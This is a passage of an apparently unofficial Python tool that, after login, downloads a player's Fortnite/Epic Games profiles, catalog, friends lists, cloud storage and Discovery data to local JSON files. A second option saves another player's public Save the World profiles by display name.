"4_research_7a4057e95", "4_research_e5b708ac9", "4_research_a22c720c9", "4_research_b406b19221", "4_research_93fb640920", "4_research_c6ac6dcd19", "4_research_bd62253618", "4_research_4f0bf50f17", "4_research_e5f6b93d8", "4_research_51ba89697", "4_research_7be60d1f6", "4_research_e05201f55", "4_research_67582b143", "4_research_ec61c87b11", "4_research_a10a422f12", "4_research_f956124d13", "4_research_4e145e6814", "4_research_0e591ba215", "4_research_822b8ca716", "rtrunk_1_0", "rtrunk_1_1", "rtrunk_2_0", "rtrunk_2_1", "rtrunk_3_0", "rtrunk_3_1", "rtrunk_4_0"], ["homebasebannericon:standardbanner1", "homebasebannericon:standardbanner2", "homebasebannericon:standardbanner3", "homebasebannericon:standardbanner4", "homebasebannericon:standardbanner5", "homebasebannericon:standardbanner6", "homebasebannericon:standardbanner7", "homebasebannericon:standardbanner8", "homebasebannericon:standardbanner9", "homebasebannericon:standardbanner10", "homebasebannericon:standardbanner11", "homebasebannericon:standardbanner12", "homebasebannericon:standardbanner13", "homebasebannericon:standardbanner14", "homebasebannericon:standardbanner15", "homebasebannericon:standardbanner16", "homebasebannericon:standardbanner17", "homebasebannericon:standardbanner18", "homebasebannericon:standardbanner19", "homebasebannericon:standardbanner20", "homebasebannericon:standardbanner21", "homebasebannericon:standardbanner22", "homebasebannericon:standardbanner23", "homebasebannericon:standardbanner24", "homebasebannericon:standardbanner25", "homebasebannericon:standardbanner26", "homebasebannericon:standardbanner27", "homebasebannericon:standardbanner28", "homebasebannericon:standardbanner29", "homebasebannericon:standardbanner30", "homebasebannericon:standardbanner31", "homebasebannericon:foundertier1banner1", "homebasebannericon:foundertier1banner2", "homebasebannericon:foundertier1banner3", "homebasebannericon:foundertier1banner4", "homebasebannericon:foundertier2banner1", "homebasebannericon:foundertier2banner2", "homebasebannericon:foundertier2banner3", "homebasebannericon:foundertier2banner4", "homebasebannericon:foundertier2banner5", "homebasebannericon:foundertier2banner6", "homebasebannericon:foundertier3banner1", "homebasebannericon:foundertier3banner2", "homebasebannericon:foundertier3banner3", "homebasebannericon:foundertier3banner4", "homebasebannericon:foundertier3banner5", "homebasebannericon:foundertier4banner1", "homebasebannericon:foundertier4banner2", "homebasebannericon:foundertier4banner3", "homebasebannericon:foundertier4banner4", "homebasebannericon:foundertier4banner5", "homebasebannericon:foundertier5banner1", "homebasebannericon:foundertier5banner2", "homebasebannericon:foundertier5banner3", "homebasebannericon:foundertier5banner4", "homebasebannericon:foundertier5banner5", "homebasebannericon:newsletterbanner", "homebasebannericon:influencerbanner1", "homebasebannericon:influencerbanner2", "homebasebannericon:influencerbanner3", "homebasebannericon:influencerbanner4", "homebasebannericon:influencerbanner5", "homebasebannericon:influencerbanner6", "homebasebannericon:influencerbanner7", "homebasebannericon:influencerbanner8", "homebasebannericon:influencerbanner9", "homebasebannericon:influencerbanner10", "homebasebannericon:influencerbanner11", "homebasebannericon:influencerbanner12", "homebasebannericon:influencerbanner13", "homebasebannericon:influencerbanner14", "homebasebannericon:influencerbanner15", "homebasebannericon:influencerbanner16", "homebasebannericon:influencerbanner17", "homebasebannericon:influencerbanner18", "homebasebannericon:influencerbanner19", "homebasebannericon:influencerbanner20", "homebasebannericon:influencerbanner21", "homebasebannericon:influencerbanner22", "homebasebannericon:influencerbanner23", "homebasebannericon:influencerbanner24", "homebasebannericon:influencerbanner25", "homebasebannericon:influencerbanner26", "homebasebannericon:influencerbanner27", "homebasebannericon:influencerbanner28", "homebasebannericon:influencerbanner29", "homebasebannericon:influencerbanner30", "homebasebannericon:influencerbanner31", "homebasebannericon:influencerbanner32", "homebasebannericon:influencerbanner33", "homebasebannericon:influencerbanner34", "homebasebannericon:influencerbanner35", "homebasebannericon:influencerbanner36", "homebasebannericon:influencerbanner37", "homebasebannericon:influencerbanner38", "homebasebannericon:influencerbanner39", "homebasebannericon:influencerbanner40", "homebasebannericon:influencerbanner41", "homebasebannericon:influencerbanner42", "homebasebannericon:influencerbanner43", "homebasebannericon:influencerbanner44", "homebasebannericon:ot1banner", "homebasebannericon:ot2banner", "homebasebannericon:ot3banner", "homebasebannericon:ot4banner", "homebasebannericon:ot5banner", "homebasebannericon:ot6banner", "homebasebannericon:ot7banner", "homebasebannericon:ot8banner", "homebasebannericon:ot9banner", "homebasebannericon:ot10banner", "homebasebannericon:ot11banner", "homebasebannericon:otherbanner1", "homebasebannericon:otherbanner2", "homebasebannericon:otherbanner3", "homebasebannericon:otherbanner4", "homebasebannericon:otherbanner5", "homebasebannericon:otherbanner6", "homebasebannericon:otherbanner7", "homebasebannericon:otherbanner8", "homebasebannericon:otherbanner9", "homebasebannericon:otherbanner10", "homebasebannericon:otherbanner11", "homebasebannericon:otherbanner12", "homebasebannericon:otherbanner13", "homebasebannericon:otherbanner14", "homebasebannericon:otherbanner15", "homebasebannericon:otherbanner16", "homebasebannericon:otherbanner17", "homebasebannericon:otherbanner18", "homebasebannericon:otherbanner19", "homebasebannericon:otherbanner20", "homebasebannericon:otherbanner21", "homebasebannericon:otherbanner22", "homebasebannericon:otherbanner23", "homebasebannericon:otherbanner24", "homebasebannericon:otherbanner25", "homebasebannericon:otherbanner26", "homebasebannericon:otherbanner27", "homebasebannericon:otherbanner28", "homebasebannericon:otherbanner29", "homebasebannericon:otherbanner30", "homebasebannericon:otherbanner31", "homebasebannericon:otherbanner32", "homebasebannericon:otherbanner33", "homebasebannericon:otherbanner34", "homebasebannericon:otherbanner35", "homebasebannericon:otherbanner36", "homebasebannericon:otherbanner37", "homebasebannericon:otherbanner38", "homebasebannericon:otherbanner39", "homebasebannericon:otherbanner40", "homebasebannericon:otherbanner41", "homebasebannericon:otherbanner42", "homebasebannericon:otherbanner43", "homebasebannericon:otherbanner44", "homebasebannericon:otherbanner45", "homebasebannericon:otherbanner46", "homebasebannericon:otherbanner47", "homebasebannericon:otherbanner48", "homebasebannericon:otherbanner49", "homebasebannericon:otherbanner50", "homebasebannericon:otherbanner51", "homebasebannericon:otherbanner52", "homebasebannericon:otherbanner53", "homebasebannericon:otherbanner54", "homebasebannericon:otherbanner55", "homebasebannericon:otherbanner56", "homebasebannericon:otherbanner57", "homebasebannericon:otherbanner58", "homebasebannericon:otherbanner59", "homebasebannericon:otherbanner60", "homebasebannericon:otherbanner61", "homebasebannericon:otherbanner62", "homebasebannericon:otherbanner63", "homebasebannericon:otherbanner64", "homebasebannericon:otherbanner65", "homebasebannericon:otherbanner66", "homebasebannericon:otherbanner67", "homebasebannericon:otherbanner68", "homebasebannericon:otherbanner69", "homebasebannericon:otherbanner70", "homebasebannericon:otherbanner71", "homebasebannericon:otherbanner72", "homebasebannericon:otherbanner73", "homebasebannericon:otherbanner74", "homebasebannericon:otherbanner75", "homebasebannericon:otherbanner76", "homebasebannericon:otherbanner77", "homebasebannericon:otherbanner78", "homebasebannercolor:defaultcolor1", "homebasebannercolor:defaultcolor2", "homebasebannercolor:defaultcolor3", "homebasebannercolor:defaultcolor4", "homebasebannercolor:defaultcolor5", "homebasebannercolor:defaultcolor6", "homebasebannercolor:defaultcolor7", "homebasebannercolor:defaultcolor8", "homebasebannercolor:defaultcolor9", "homebasebannercolor:defaultcolor10", "homebasebannercolor:defaultcolor11", "homebasebannercolor:defaultcolor12", "homebasebannercolor:defaultcolor13", "homebasebannercolor:defaultcolor14", "homebasebannercolor:defaultcolor15", "homebasebannercolor:defaultcolor16", "homebasebannercolor:defaultcolor17", "homebasebannercolor:defaultcolor18", "homebasebannercolor:defaultcolor19", "homebasebannercolor:defaultcolor20", "homebasebannercolor:defaultcolor21"], {"campaign": {"node_costs": "node_costs", "mission_alert_redemption_record": "mission_alert_redemption_record", "twitch": "twitch", "client_settings": "client_settings", "level": "level", "quest_manager": "quest_manager", "gameplay_stats": "gameplay_stats", "inventory_limit_bonus": "inventory_limit_bonus", "mode_loadouts": "mode_loadouts", "daily_rewards": "daily_rewards", "xp": "xp", "packs_granted": "packs_granted"}, "common_core": {"bans": "ban_history", "current_mtx_platform": "current_mtx_platform", "weekly_purchases": "weekly_purchases", "daily_purchases": "daily_purchases", "in_app_purchases": "in_app_purchases"}, "common_public": {"townName": "homebase_name", "bannerIconId": "banner_icon", "bannerColorId": "banner_color"}}]
                profileContents, bHasCampaignAccess, bHasBanners = [{}, False, False]
                profile0 = {"_id":"","created":"","displayname":"","updated":"","rvn":0,"wipeNumber":1,"accountId":"","profileId":"profile0","version":"","items":{},"stats":{"templateId":"profile_v2","attributes":{"node_costs":{},"mission_alert_redemption_record":{},"twitch":{},"client_settings":{},"level":1,"named_counters":{},"default_hero_squad_id":"","collection_book":{"pages":["CollectionBookPage:pageheroes_ninja","CollectionBookPage:pageheroes_outlander","CollectionBookPage:pageheroes_commando","CollectionBookPage:pageheroes_constructor","CollectionBookPage:pagepeople_defenders","CollectionBookPage:pagepeople_leads","CollectionBookPage:pagepeople_uniqueleads","CollectionBookPage:pagepeople_survivors","CollectionBookPage:pageranged_assault_weapons","CollectionBookPage:pageranged_shotgun_weapons","CollectionBookPage:page_ranged_pistols_weapons","CollectionBookPage:pageranged_snipers_weapons","CollectionBookPage:pageranged_shotgun_weapons_crystal","CollectionBookPage:pageranged_assault_weapons_crystal","CollectionBookPage:page_ranged_pistols_weapons_crystal","CollectionBookPage:pageranged_snipers_weapons_crystal","CollectionBookPage:pagetraps_wall","CollectionBookPage:pagetraps_ceiling","CollectionBookPage:pagetraps_floor","CollectionBookPage:pagemelee_swords_weapons","CollectionBookPage:pagemelee_swords_weapons_crystal","CollectionBookPage:pagemelee_axes_weapons","CollectionBookPage:pagemelee_axes_weapons_crystal","CollectionBookPage:pagemelee_scythes_weapons","CollectionBookPage:pagemelee_scythes_weapons_crystal","CollectionBookPage:pagemelee_clubs_weapons","CollectionBookPage:pagemelee_clubs_weapons_crystal","CollectionBookPage:pagemelee_spears_weapons","CollectionBookPage:pagemelee_spears_weapons_crystal","CollectionBookPage:pagemelee_tools_weapons","CollectionBookPage:pagemelee_tools_weapons_crystal","CollectionBookPage:pageranged_explosive_weapons","CollectionBookPage:pagespecial_chinesenewyear2018_heroes","CollectionBookPage:pagespecial_weapons_chinesenewyear2018","CollectionBookPage:pagespecial_weapons_crystal_chinesenewyear2018","CollectionBookPage:pagespecial_springiton2018_people","CollectionBookPage:pagespecial_stormzonecyber_heroes","CollectionBookPage:pagespecial_stormzonecyber_ranged","CollectionBookPage:pagespecial_stormzonecyber_melee","CollectionBookPage:pagespecial_stormzonecyber_ranged_crystal","CollectionBookPage:pagespecial_stormzonecyber_melee_crystal","CollectionBookPage:pagespecial_blockbuster2018_heroes","CollectionBookPage:pagespecial_blockbuster2018_ranged","CollectionBookPage:pagespecial_blockbuster2018_ranged_crystal","CollectionBookPage:pagespecial_roadtrip2018_heroes","CollectionBookPage:pagespecial_roadtrip2018_weapons","CollectionBookPage:pagespecial_roadtrip2018_weapons_crystal","CollectionBookPage:pagespecial_hydraulic","CollectionBookPage:pagespecial_hydraulic_crystal","CollectionBookPage:pagespecial_stormzone_heroes","CollectionBookPage:pagespecial_scavenger","CollectionBookPage:pagespecial_scavenger_crystal","CollectionBookPage:pagespecial_scavenger_heroes","CollectionBookPage:pagespecial_halloween2017_heroes","CollectionBookPage:pagespecial_halloween2017_workers","CollectionBookPage:pagespecial_weapons_ranged_stormzone2","CollectionBookPage:pagespecial_weapons_ranged_stormzone2_crystal","CollectionBookPage:pagespecial_weapons_melee_stormzone2","CollectionBookPage:pagespecial_weapons_melee_stormzone2_crystal","CollectionBookPage:pagespecial_winter2017_heroes","CollectionBookPage:pagespecial_weapons_ranged_winter2017","CollectionBookPage:pagespecial_weapons_ranged_winter2017_crystal","CollectionBookPage:pagespecial_weapons_melee_winter2017","CollectionBookPage:pagespecial_weapons_melee_winter2017_crystal","CollectionBookPage:pagespecial_winter2017_weapons","CollectionBookPage:pagespecial_winter2017_weapons_crystal","CollectionBookPage:pagespecial_ratrod_weapons","CollectionBookPage:pagespecial_ratrod_weapons_crystal","CollectionBookPage:pagespecial_weapons_ranged_medieval","CollectionBookPage:pagespecial_weapons_ranged_medieval_crystal","CollectionBookPage:pagespecial_weapons_melee_medieval","CollectionBookPage:pagespecial_weapons_melee_medieval_crystal"],"maxBookXpLevelAchieved":0},"quest_manager":{},"bans":{},"gameplay_stats":[],"inventory_limit_bonus":0,"current_mtx_platform":"Epic","weekly_purchases":{},"daily_purchases":{},"mode_loadouts":[],"in_app_purchases":{},"daily_rewards":{},"monthly_purchases":{},"xp":0,"homebase":{"townName":"","bannerIconId":"","bannerColorId":"","flagPattern":-1,"flagColor":-1},"packs_granted":0}},"commandRevision":0} # profile0 template from Lawinserver
                for profile0Profile in profile0ProfilesList:
                    with open(os.path.join(profilePath, f"{profile0Profile}.json"), "r", encoding = "utf-8") as profile0File: profileContents[profile0Profile] = json.loads(profile0File.read())
                for profileName in profileContents:
                    itemsToPop = []
                    if profileName.lower() == "campaign":
                        for item in profileContents[profileName]['items']:
                            if profileContents[profileName]['items'][f'{item}']['templateId'].lower().startswith("worker:"):
                                try: profileContents[profileName]['items'][f'{item}']['attributes']['portrait'] = f"/Game/UI/Icons/Icon-Worker/IconDefinitions/{profileContents[profileName]['items'][f'{item}']['attributes']['portrait'].split(':')[-1]}.{profileContents[profileName]['items'][f'{item}']['attributes']['portrait'].split(':')[-1]}"
                                except: []
                            elif profileContents[profileName]['items'][f'{item}']['templateId'].lower().startswith("cardpack:") and (not (profileContents[profileName]['items'][f'{item}']['templateId'].lower() in supportedLlamas)): itemsToPop.append(f'{item}')
                            if profileContents[profileName]['items'][f'{item}']['templateId'].lower().startswith("worker:worker_karolina_ur") or profileContents[profileName]['items'][f'{item}']['templateId'].lower().startswith("worker:worker_joel_ur"): itemsToPop.append(f'{item}')
                        profile0['_id'], profile0['created'], profile0['updated'], profile0['rvn'], profile0['wipeNumber'], profile0['accountId'], profile0['version'], profile0['commandRevision'] = [profileContents[profileName]['_id'], profileContents[profileName]['created'], profileContents[profileName]['updated'], profileContents[profileName]['rvn'], profileContents[profileName]['wipeNumber'], profileContents[profileName]['accountId'], profileContents[profileName]['version'], profileContents[profileName]['commandRevision']]
                    if profileName.lower() == "common_core":
                        for item in profileContents[profileName]['items']:
                            if ((profileContents[profileName]['items'][item]['templateId'].lower().startswith("homebasebannericon:") or profileContents[profileName]['items'][item]['templateId'].lower().startswith("homebasebannercolor:")) and (not (profileContents[profileName]['items'][item]['templateId'].lower() in validBanners))): itemsToPop.append(f'{item}')
                    if profileName.lower() == "common_public":
                        for attr in attributes[profileName]:
                            try: profile0['stats']['attributes']['homebase'][f'{attr}'] = profileContents[profileName]['stats']['attributes'][f'{attributes[profileName][f"{attr}"]}']
                            except: []
                    else:
                        try: 
                            for attr in attributes[profileName]:
                                try: profile0['stats']['attributes'][f'{attr}'] = profileContents[profileName]['stats']['attributes'][f'{attributes[profileName][f"{attr}"]}']
                                except: []
                        except: []
                    for item in itemsToPop: profileContents[profileName]['items'].pop(f'{item}')
                    profile0['items'] = {**profile0['items'], **profileContents[profileName]['items']}
                for item in profile0['items']:
                    if profile0['items'][item]['templateId'].lower() == "token:campaignaccess": bHasCampaignAccess = True
                    elif profile0['items'][item]['templateId'].lower().startswith("homebasebannericon:") or profile0['items'][item]['templateId'].lower().startswith("homebasebannercolor:"): bHasBanners = True
                if bHasCampaignAccess == False: profile0['items'][str(uuid.uuid4())] = {"templateId":"Token:campaignaccess","attributes":{"max_level_bonus":0,"level":1,"item_seen":True,"xp":0,"favorite":False},"quantity":1}
                if bHasBanners == False: profile0['items'][str(uuid.uuid4())], profile0['items'][str(uuid.uuid4())], profile0['stats']['attributes']['homebase']['bannerIconId'], profile0['stats']['attributes']['homebase']['bannerColorId'] = [{"templateId":"HomebaseBannerIcon:ot11banner","attributes":{"item_seen":True},"quantity":1}, {"templateId":"HomebaseBannerColor:defaultcolor15","attributes":{"item_seen":True},"quantity":1}, "ot11banner", "defaultcolor15"]
                for node in profile0Nodes: profile0['items'][str(uuid.uuid4())] = {"templateId": f'HomebaseNode:t{node}', "attributes": {"item_seen": True}, "quantity": 1}
                with open(profileFilePath, "w", encoding = "utf-8") as fileToSave: json.dump(profile0, fileToSave, indent = 2, ensure_ascii = False)
                bProfileDumped = True
            else: print(f"{profileCount}: Failed to recreate and dump the {profile} profile")
        else:
            reqGetProfile = requestText(session.post(links.profileRequest.format(headersFormat1, headersFormat2, headersFormat3, profile), headers=vars.headers, data="{}"), True)
            with open(profileFilePath, "w", encoding = "utf-8") as profileFile: json.dump(reqGetProfile['profileChanges'][0]['profile'], profileFile, indent = 2, ensure_ascii = False)
            bProfileDumped = True
        if bProfileDumped == True:
            fileSize = roundSize(profileFilePath)
            print(f"{profileCount}: Dumped the {profile} profile ({fileSize} KB)")

# The Anyone's StW Profile Dumper part of the program.
def anyonesStWProfileDumper():
    # Get the account id using displayname.
    while True:
        reqGetAccountId = json.loads(session.get(links.getAccountIdByName.format(input("Insert the epic displayname of the account whose Save the World profiles you'd want the program to save:\n")), headers=vars.headers, data="{}").text)
        if not ("errorMessage" in reqGetAccountId): break
        else: print(f"ERROR: {reqGetAccountId['errorMessage']}. Please try again with a different username.\n")
    accountId, displayName = [reqGetAccountId['id'], reqGetAccountId['displayName']]

    publicProfilePath, publicProfilesList = [os.path.join(vars.path, f"{displayName}'s STW Profiles"), ["campaign", "common_public", "profile0"]]  # profile0 has to be after campaign and common_public since the program is going to recreate it using them.
    if not os.path.exists(publicProfilePath): os.makedirs(publicProfilePath)

    # Get and dump the profiles.
    profilesWord, haveWord = ["profiles", "have"]
    if len(publicProfilesList) == 1: profilesWord, haveWord = ["profile", "has"]
    print(f"\nDumping {len(publicProfilesList)} {displayName}'s Save the World {profilesWord}...\n")
    dumpProfiles(publicProfilesList, ["campaign", "common_public"], publicProfilePath, accountId, "public", "QueryPublicProfile")
    print(f"\n{displayName}'s Save the World {profilesWord} {haveWord} been successfully saved in {publicProfilePath}.\n")
    if bDumpAcocuntInfo == "true":
        accountInfoPath = os.path.join(vars.path, f"{displayName}'s Account Info")
        if not os.path.exists(accountInfoPath): os.makedirs(accountInfoPath)
        for response in links.accountInfo:
            reqGetResponseText = requestText(session.get(response[0].format(accountId), headers=vars.headers, data=""), True)
            filePathToSave = os.path.join(accountInfoPath, f"{response[2]}.json")
            with open(filePathToSave, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetResponseText, fileToSave, indent = 2, ensure_ascii = False)
            fileSize = roundSize(filePathToSave)
            print(f"Dumped the {response[1]} ({fileSize} KB)")
        print(f"\n{vars.displayName}'s Account Information responses have been successfully saved in {accountInfoPath}.\n")

# The main part of the program
def main():
    if bDumpSingleResponses == bDumpCatalog == bDumpProfiles == bDumpFriendlists == bDumpDiscovery == bDumpAccountCloudstorage == bDumpGlobalCloudstorage == "false": print(f"You set everything the program can save to false in the config. Why are we still here? Just to suffer?\n")

    # Get and dump single responses.
    if bDumpSingleResponses == "true":
        responseCount = 0
        for response in links.singleResponses:
            reqGetResponseText = requestText(session.get(response[0], headers=vars.headers, data=response[1]), True)
            filePathToSave = os.path.join(vars.path, f"{response[3]}.json")
            with open(filePathToSave, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetResponseText, fileToSave, indent = 2, ensure_ascii = False)
            fileSize = roundSize(filePathToSave)
            print(f"Dumped the {response[2]} ({fileSize} KB) to {filePathToSave}.\n")
            responseCount += 1

    # Get and dump catalog related responses.
    if bDumpCatalog == "true":
        catalogPath = os.path.join(vars.path, "Catalog Responses")
        if not os.path.exists(catalogPath): os.makedirs(catalogPath)
        reqGetCatalog = requestText(session.get(links.catalog, headers=vars.headers, data="{}"), True)
        filePathToSave = os.path.join(catalogPath, "catalog.json")
        with open(filePathToSave, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetCatalog, fileToSave, indent = 2, ensure_ascii = False)
        fileSize = roundSize(filePathToSave)
        print(f"Dumped the Catalog ({fileSize} KB)")
        appStoreIds = []
        for storefront in reqGetCatalog['storefronts']:
            for catalogEntry in storefront['catalogEntries']:
                try:
                    if catalogEntry['appStoreId'][1]: appStoreIds.append(catalogEntry['appStoreId'][1])
                except: []
        if appStoreIds:
            bulkFormat = ""
            for id in appStoreIds:
                if appStoreIds != "": bulkFormat += "&"
                bulkFormat += f"id={id}"
            bulkFormat += f"&returnItemDetails=true&country={country.upper()}&locale={lang}"
            reqGetBulkOffers = requestText(session.get(links.catalogBulkOffers.format(bulkFormat), headers=vars.headers, data="{}"), True)
            filePathToSave = os.path.join(catalogPath, "bulkOffers.json")
            with open(filePathToSave, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetBulkOffers, fileToSave, indent = 2, ensure_ascii = False)
            fileSize = roundSize(filePathToSave)
            print(f"Dumped the Catalog Bulk Offers ({fileSize} KB)\nCatalog responses have been successfully saved in {catalogPath}.\n")

    # Get and dump the profiles.
    if bDumpProfiles == "true":
        profilePath = os.path.join(vars.path, f"{vars.displayName}'s Profiles")
        if not os.path.exists(profilePath): os.makedirs(profilePath)
        profiles = ["athena", "campaign", "collection_book_people0", "collection_book_schematics0", "collections", "common_core", "common_public", "creative", "metadata", "outpost0", "profile0", "recycle_bin", "theater0", "theater1", "theater2"] # profile0 has to be after campaign, common_core, common_public and metadata since the program is going to recreate it using them.
        print(f"Starting to dump {len(profiles)} {vars.displayName}'s profiles")
        dumpProfiles(profiles, ["campaign", "common_core", "common_public", "metadata"], profilePath, vars.accountId, "client", "QueryProfile")
        print(f"\n{vars.displayName}'s profiles have been successfully saved in {profilePath}.\n")

    # Get and dump the Account Information.
    if bDumpAcocuntInfo == "true":
        accountInfoPath = os.path.join(vars.path, f"{vars.displayName}'s Account Info")
        if not os.path.exists(accountInfoPath): os.makedirs(accountInfoPath)
        for response in links.accountInfo:
            reqGetResponseText = requestText(session.get(response[0].format(vars.accountId), headers=vars.headers, data=""), True)
            filePathToSave = os.path.join(accountInfoPath, f"{response[2]}.json")
            with open(filePathToSave, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetResponseText, fileToSave, indent = 2, ensure_ascii = False)
            fileSize = roundSize(filePathToSave)
            print(f"Dumped the {response[1]} ({fileSize} KB)")
        print(f"\n{vars.displayName}'s Account Information responses have been successfully saved in {accountInfoPath}.\n")

    # Get and dump the Epic Friends related responses.
    if bDumpFriendlists == "true":
        friendsPath = os.path.join(vars.path, f"{vars.displayName}'s Friends")
        if not os.path.exists(friendsPath): os.makedirs(friendsPath)
        for friendslist in links.friendlists:
            reqGetFriendslistText = requestText(session.get(friendslist[0].format(vars.accountId), headers=vars.headers, data="{}"), True)
            friendslistFilePath = os.path.join(friendsPath, f"{friendslist[2]}.json")
            with open(friendslistFilePath, "w") as fileToSave: json.dump(reqGetFriendslistText, fileToSave, indent = 2)
            fileSize = roundSize(friendslistFilePath)
            print(f"Dumped the {friendslist[1]} ({fileSize} KB)")
        friendAccountIds = ""
        for friend in reqGetFriendslistText['friends']:
            if friendAccountIds != "": friendAccountIds += "&"
            friendAccountIds += f"accountId={friend['accountId']}"
        reqGetFriendsInfoText = requestText(session.get(links.friendsinfo.format(friendAccountIds), headers=vars.headers, data="{}"), True)
        friendsInfoFilePath = os.path.join(friendsPath, f"friendsinfo.json")
        with open(friendsInfoFilePath, "w") as fileToSave: json.dump(reqGetFriendsInfoText, fileToSave, indent = 2)
        fileSize = roundSize(friendsInfoFilePath)
        print(f"Dumped the Friends Info ({fileSize} KB)\n\n{vars.displayName}'s Epic Friends responses have been successfully saved in {friendsPath}.\n")

    # Get and dump the account Cloudstorage.
    if bDumpAccountCloudstorage == "true":
        userCSPath = os.path.join(vars.path, f"{vars.displayName}'s Cloudstorage")
        if not os.path.exists(userCSPath): os.makedirs(userCSPath)
        reqGetCloudstorageText = requestText(session.get(links.cloudstorageRequest.format(f"user/{vars.accountId}"), headers=vars.headers, data="{}"), True)
        cloudstorageCount = 0
        print(f"Starting to dump {len(reqGetCloudstorageText)} {vars.displayName}'s Cloudstorage files")
        for key in reqGetCloudstorageText:
            reqGetCloudstorageFileText = session.get(links.cloudstorageRequest.format(f"user/{vars.accountId}/{key['uniqueFilename']}"), headers=vars.headers, data="").content
            cloudstorageCount += 1
            if (bSaveEmptyCloudstorage == "false") and (not reqGetCloudstorageFileText): print(f"{cloudstorageCount}: Skipping {key['filename']} because it's empty.")
            else:
                cloudstorageFilePath = os.path.join(userCSPath, f"{key['filename']}")
                with open(cloudstorageFilePath, "wb") as fileToSave: fileToSave.write(reqGetCloudstorageFileText)
                fileSize = roundSize(cloudstorageFilePath)
                print(f"{cloudstorageCount}: Dumped {key['filename']} ({fileSize} KB)")
        print(f"\n{vars.displayName}'s Cloudstorage files have been successfully saved in {userCSPath}.\n")

    # Get and dump the global Cloudstorage.
    if bDumpGlobalCloudstorage == "true":
        globalCSPath = os.path.join(vars.path, "Global Cloudstorage")
        if not os.path.exists(globalCSPath): os.makedirs(globalCSPath)
        reqGetCloudstorageText = requestText(session.get(links.cloudstorageRequest.format("system"), headers=vars.headers, data="{}"), True)
        cloudstorageCount = 0
        print(f"Starting to dump {len(reqGetCloudstorageText)} global Cloudstorage files")
        for key in reqGetCloudstorageText:
            reqGetCloudstorageFileText = requestText(session.get(links.cloudstorageRequest.format(f"system/{key['uniqueFilename']}"), headers=vars.headers, data=""), False)
            cloudstorageCount += 1
            if (bSaveEmptyCloudstorage == "false") and (not reqGetCloudstorageFileText): print(f"{cloudstorageCount}: Skipping {key['filename']} because it's empty.")
            else:
                cloudstorageFilePath = os.path.join(globalCSPath, f"{key['filename']}")
                with open(cloudstorageFilePath, "w", encoding = "utf-8") as fileToSave: fileToSave.write(reqGetCloudstorageFileText)
                fileSize = roundSize(cloudstorageFilePath)
                print(f"{cloudstorageCount}: Dumped {key['filename']} ({fileSize} KB)")
        print(f"\nGlobal Cloudstorage files have been successfully saved in {globalCSPath}.\n")

    # Get and dump the Discovery responses.
    if bDumpDiscovery == "true":
        discoveryPath, testCohorts = [os.path.join(vars.path, f"{vars.displayName}'s Discovery Tab"), []]
        if not os.path.exists(discoveryPath): os.makedirs(discoveryPath)
        reqGetDiscoveryFrontend = requestText(session.post(links.discovery.format(vars.accountId), headers=vars.headers, json={"surfaceName":"CreativeDiscoverySurface_Frontend","revision":-1,"partyMemberIds":[vars.accountId],"matchmakingRegion":"EU"}), True)
        discoveryFrontendFilePath = os.path.join(discoveryPath, "discovery_frontend.json")
        with open(discoveryFrontendFilePath, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetDiscoveryFrontend, fileToSave, indent = 2, ensure_ascii = False)
        fileSize = roundSize(discoveryFrontendFilePath)
        print(f"Dumped Discovery - Frontend ({fileSize} KB)")
        try: testCohorts = reqGetDiscoveryFrontend['testCohorts'] # the TestCohorts have to be grabbed from the "Discovery - Surface Frontend" response
        except: []
        if testCohorts:
            for panelName in reqGetDiscoveryFrontend['panels']:
                panelName, pageIndex = [panelName['panelName'], 0]
                while True:
                    pageIndex += 1
                    reqGetPanel = requestText(session.post(links.discovery.format(f'page/{vars.accountId}'), headers=vars.headers, json={"surfaceName":"CreativeDiscoverySurface_Frontend","panelName":panelName,"pageIndex":pageIndex,"revision":-1,"testCohorts":testCohorts,"partyMemberIds":[vars.accountId],"matchmakingRegion":"EU"}), True)
                    for item in reqGetPanel['results']: mnemonic.append({"mnemonic": item['linkCode'], "type": "", "filter": False, "v": ""})
                    pageWord = f" (Page {pageIndex})"
                    if ((reqGetPanel['hasMore'] == False) and (pageIndex == 1)): panelFilePath, pageWord = [os.path.join(discoveryPath, f"discovery_{panelName.replace(' ', '')}.json".lower()), ""]
                    else:
                        panelFilePath = os.path.join(discoveryPath, panelName)
                        if not os.path.exists(panelFilePath): os.makedirs(panelFilePath)
                        panelFilePath = os.path.join(panelFilePath, f"discovery_{panelName.replace(' ', '')}{pageIndex}.json".lower())
                    with open(panelFilePath, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetPanel, fileToSave, indent = 2, ensure_ascii = False)
                    fileSize = roundSize(panelFilePath)
                    print(f"Dumped Discovery - {panelName}{pageWord} ({fileSize} KB)")
                    if reqGetPanel['hasMore'] == False: break
        reqGetDiscoveryLibrary = requestText(session.post(links.discovery.format(vars.accountId), headers=vars.headers, json={"surfaceName":"CreativeDiscoverySurface_Library","revision":-1,"partyMemberIds":[vars.accountId],"matchmakingRegion":"EU"}), True)
        discoveryLibraryFilePath = os.path.join(discoveryPath, "discovery_library.json")
        with open(discoveryLibraryFilePath, "w", encoding = "utf-8") as fileToSave: json.dump(reqGetDiscoveryLibrary, fileToSave, indent = 2, ensure_ascii = False)
        fileSize = roundSize(discoveryLibraryFilePath)
        print(f"Dumped Discovery - Library ({fileSize} KB)\n\n{vars.displayName}'s Discovery Tab responses have been successfully saved in {discoveryPath}.\n")
    
# Start the program
while True:
    whatToDo = validInput("Main menu:\nType 1 if you want to start the main program and press ENTER.\nType 2 if you want to dump someone else's Save the World profiles and press ENTER.\nType 3 if you want to stop the program and press ENTER.", ["1", "2", "3"])
    if whatToDo == "3": break
    login()
    vars.path = os.path.join(os.path.split(os.path.abspath(__file__))[0], "Dumped files", datetime.today().strftime('%Y-%m-%d %H-%M-%S'))
    if not os.path.exists(vars.path): os.makedirs(vars.path)
    if whatToDo == "1": main()
    elif whatToDo == "2": anyonesStWProfileDumper()

input("Press ENTER to close the program.\n")
exit()